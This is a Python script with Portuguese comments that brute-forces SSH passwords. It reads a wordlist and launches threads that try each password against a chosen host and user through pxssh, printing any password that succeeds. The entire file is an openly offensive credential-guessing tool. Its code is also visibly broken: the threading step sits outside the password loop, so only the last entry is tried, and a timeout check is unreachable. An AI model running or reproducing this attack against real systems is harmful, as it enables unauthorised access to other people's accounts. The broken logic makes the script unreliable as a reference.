#!/usr/bin/python
# -*- coding: utf-8 -*-

import pxssh
import optparse
import time
from threading import *

# Seta 5 threads no maximo
maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)

# Seta as variaveis globais com valores default
Found = False
Fails = 0


def connect(host, user, password, release):
    """ Funcao para conectar via ssh no host alvo """

    # Variaveis globais
    global Found
    global Fails

    try:
        # Cria um objeto da classe pxssh para conexao via ssh
        s = pxssh.pxssh()
        # Tenta realizar o login no alvo
        s.login(host, user, password)
        # Retorna a estancia da conexao
        print('[+] Password Found: %s' % (password))
        # Seta a variavel global Found como True
        Found = True
    except Exception as e:
        # Se retornar read_nonblocking, aguarda 5segundos para tentar novamente
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        # Se retornar synchronize with original prompt aguarda 1 segundo para tentar novamente
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        # Se conseguiu conectar apenas libera a conexao
        if release:
            connection_lock.release()


def main():
    """ Funcao principal """

    # Parse explicando como deve ser a chamada do script
    parser = optparse.OptionParser('usage %prog -H <target host> -u <user> -F <password list>')

    # Separa os parametros solicitados
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-F', dest='passwdFile', type='string', help='specify password file')
    parser.add_option('-u', dest='user', type='string', help='specify the user')

    # Faz o parse dos parametros
    (options, args) = parser.parse_args()
    host = options.tgtHost
    passwdFile = options.passwdFile
    user = options.user

    # Se nao receber os parametros solicitados para o script
    if not host or not passwdFile or not user:
        print(parser.usage)
        exit(0)

    # Abre o arquivo de senha
    fn = open(passwdFile, 'r')

    # Loopa tpdas as senha do arquivo
    for line in fn.readlines():
        # Se ja achou a senha valida, informa
        if Found:
            print("[*] Exiting: Password Found")
            exit(0)
            # Para o script com muitas tentativas
            if Fails > 5:
                print("[!] Exiting: Too Many Socket Timeouts")
                exit(0)

    # Adiquire um block, blocking ou nom-blocling para a thred em semaforo
    connection_lock.acquire()

    # Retira a quebra de linha da senha, veio como texto
    password = line.strip('\r').strip('\n')
    print("[-] Testing: %s" % (str(password)))

    # Cria uma thread chamando a funcao de conectar e passando o Host e a porta como parametro
    t = Thread(target=connect, args=(host, user, password, True))
    t.start()

# Chama a funcao main principal
if __name__ == '__main__':
    main()
